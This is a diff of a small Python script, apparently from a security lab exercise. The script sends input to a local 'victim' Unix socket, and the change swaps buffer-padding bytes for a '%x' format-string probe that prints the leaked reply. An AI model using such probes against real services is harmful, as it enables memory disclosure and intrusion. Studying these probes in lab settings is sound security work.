@@ -4,17 +4,13 @@ import sys, os
 sock = os.getenv("HOME") + "/victim.sock"
 s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 s.connect(sock)
-str = b'A' * 24 + b'\n48\n'
+str = b'%x' + b'\n50\n'
 s.send(str)
 data = s.recv(1024)
 s.close()
 
-valuebyte = ''
-for i in range(48):
-	valuebyte += hex(ord(data[i])) + '\t'
-	if (i+1)%8 == 0:
-		print(valuebyte)
-		valuebyte = ''
+print(data)
+print(repr(data))
 
 filename = '/tmp/someData.txt'
 with open(filename, 'w') as file_object:
